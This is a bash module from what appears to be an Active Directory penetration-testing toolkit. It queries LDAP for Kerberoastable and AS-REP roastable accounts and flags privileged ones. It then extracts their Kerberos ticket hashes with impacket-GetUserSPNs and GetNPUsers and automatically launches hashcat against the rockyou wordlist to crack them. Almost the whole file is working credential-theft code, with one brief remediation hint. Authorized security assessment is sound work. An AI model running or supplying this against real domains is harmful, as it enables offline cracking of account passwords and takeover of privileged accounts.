#!/bin/bash
################################################################################
# MODULE: Kerberos Attacks - COMPLETE FIX
# Coverage: Kerberoasting, AS-REP roasting, hash extraction + cracking
# FIX: Shows actual usernames in findings
################################################################################

run_kerberos_enum() {
    echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║  PHASE 2: Kerberos Attack Surface (Hash Extraction)                  ║${NC}"
    echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Find Kerberoastable accounts
    run_ldap "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))" \
        "kerberos/01_kerberoastable.ldif" "Finding Kerberoastable accounts" "sAMAccountName servicePrincipalName"
    
    local kerb_count=$(grep -c "^dn:" "kerberos/01_kerberoastable.ldif" 2>/dev/null || echo 0)
    kerb_count="${kerb_count//[^0-9]/}"
    [ -z "$kerb_count" ] && kerb_count=0
    
    if [ "$kerb_count" -gt 0 ]; then
        # FIX: Extract actual usernames
        local kerb_users=$(grep "sAMAccountName:" "kerberos/01_kerberoastable.ldif" | awk '{print $2}' | head -10 | tr '\n' ',' | sed 's/,$//')
        
        add_finding "CRITICAL" "Kerberoasting" \
            "$kerb_count Kerberoastable accounts found - credentials can be cracked offline! Accounts: $kerb_users" \
            "impacket-GetUserSPNs $DOMAIN/$USERNAME:'$PASSWORD' -dc-ip $DC_IP -request"
        
        # Check if any are admin accounts
        run_ldap "(&(adminCount=1)(servicePrincipalName=*))" \
            "kerberos/01_kerberoastable_admins.ldif" "Finding Kerberoastable ADMIN accounts"
        
        local admin_kerb_count=$(grep -c "^dn:" "kerberos/01_kerberoastable_admins.ldif" 2>/dev/null || echo 0)
        admin_kerb_count="${admin_kerb_count//[^0-9]/}"
        [ -z "$admin_kerb_count" ] && admin_kerb_count=0
        
        if [ "$admin_kerb_count" -gt 0 ]; then
            # FIX: Extract privileged Kerberoastable usernames
            local admin_kerb_users=$(grep "sAMAccountName:" "kerberos/01_kerberoastable_admins.ldif" | awk '{print $2}' | tr '\n' ',' | sed 's/,$//')
            
            add_finding "CRITICAL" "Kerberoasting" \
                "$admin_kerb_count PRIVILEGED accounts are Kerberoastable: $admin_kerb_users" \
                "HIGH PRIORITY: Remove SPNs or use gMSA with 100+ char passwords"
        fi
        
        # Extract hashes if Impacket available and auth provided
        if command -v impacket-GetUserSPNs &>/dev/null && [ "$AUTH_TYPE" == "userpass" ]; then
            log_action "Extracting Kerberoast hashes..."
            ((TOTAL_CHECKS++))
            
            impacket-GetUserSPNs "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$DC_IP" -request \
                -outputfile "kerberos/kerberoast_hashes_$(date +%Y%m%d).txt" 2>&1 | tee "kerberos/kerberoast.log"
            
            if [ -f "kerberos/kerberoast_hashes_"*.txt ]; then
                local hash_file=$(ls -t kerberos/kerberoast_hashes_*.txt 2>/dev/null | head -1)
                local hash_count=$(grep -c '$krb5tgs$' "$hash_file" 2>/dev/null || echo 0)
                
                if [ $hash_count -gt 0 ]; then
                    log_success "Extracted $hash_count TGS hashes → $hash_file"
                    ((SUCCESSFUL_CHECKS++))
                    
                    log_info "Crack with: hashcat -m 13100 $hash_file /usr/share/wordlists/rockyou.txt"
                    
                    # Auto-crack if hashcat available
                    if command -v hashcat &>/dev/null; then
                        log_action "Starting hashcat in background..."
                        hashcat -m 13100 "$hash_file" /usr/share/wordlists/rockyou.txt \
                            --potfile-path="kerberos/kerberoast.pot" --quiet &
                        echo $! > kerberos/.hashcat_pid
                        log_info "Hashcat PID: $(cat kerberos/.hashcat_pid)"
                    fi
                else
                    log_warning "Hash extraction succeeded but no hashes found"
                    ((SUCCESSFUL_CHECKS++))
                fi
            else
                log_warning "No hashes extracted (accounts may not be exploitable)"
                ((FAILED_CHECKS++))
            fi
        fi
    fi
    
    # Find AS-REP roastable accounts
    run_ldap "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
        "kerberos/02_asrep_roastable.ldif" "Finding AS-REP roastable accounts" "sAMAccountName userPrincipalName"
    
    local asrep_count=$(grep -c "^dn:" "kerberos/02_asrep_roastable.ldif" 2>/dev/null || echo 0)
    asrep_count="${asrep_count//[^0-9]/}"
    [ -z "$asrep_count" ] && asrep_count=0
    
    if [ "$asrep_count" -gt 0 ]; then
        # FIX: Extract usernames
        local asrep_users=$(grep "sAMAccountName:" "kerberos/02_asrep_roastable.ldif" | awk '{print $2}' | tr '\n' ',' | sed 's/,$//')
        
        add_finding "CRITICAL" "AS-REP Roasting" \
            "$asrep_count AS-REP roastable accounts - NO AUTH required to crack! Accounts: $asrep_users" \
            "impacket-GetNPUsers $DOMAIN/ -usersfile asrep_users.txt -dc-ip $DC_IP -format hashcat"
        
        # Extract usernames for Impacket
        grep "sAMAccountName:" "kerberos/02_asrep_roastable.ldif" | awk '{print $2}' > "kerberos/asrep_users.txt"
        
        # Extract hashes if Impacket available
        if command -v impacket-GetNPUsers &>/dev/null && [ -s "kerberos/asrep_users.txt" ]; then
            log_action "Extracting AS-REP hashes..."
            ((TOTAL_CHECKS++))
            
            impacket-GetNPUsers "$DOMAIN/" -usersfile "kerberos/asrep_users.txt" -dc-ip "$DC_IP" \
                -format hashcat -outputfile "kerberos/asrep_hashes_$(date +%Y%m%d).txt" 2>&1 | tee "kerberos/asrep.log"
            
            if [ -f "kerberos/asrep_hashes_"*.txt ]; then
                local hash_file=$(ls -t kerberos/asrep_hashes_*.txt 2>/dev/null | head -1)
                local hash_count=$(grep -c '$krb5asrep$' "$hash_file" 2>/dev/null || echo 0)
                
                if [ $hash_count -gt 0 ]; then
                    log_success "Extracted $hash_count AS-REP hashes → $hash_file"
                    ((SUCCESSFUL_CHECKS++))
                    
                    log_info "Crack with: hashcat -m 18200 $hash_file /usr/share/wordlists/rockyou.txt"
                    
                    # Auto-crack if hashcat available
                    if command -v hashcat &>/dev/null; then
                        log_action "Starting hashcat in background..."
                        hashcat -m 18200 "$hash_file" /usr/share/wordlists/rockyou.txt \
                            --potfile-path="kerberos/asrep.pot" --quiet &
                        echo $! > kerberos/.hashcat_asrep_pid
                    fi
                else
                    log_warning "Hash extraction succeeded but no hashes found"
                    ((SUCCESSFUL_CHECKS++))
                fi
            else
                log_warning "No AS-REP hashes extracted"
                ((FAILED_CHECKS++))
            fi
        fi
    fi
    
    echo ""
}
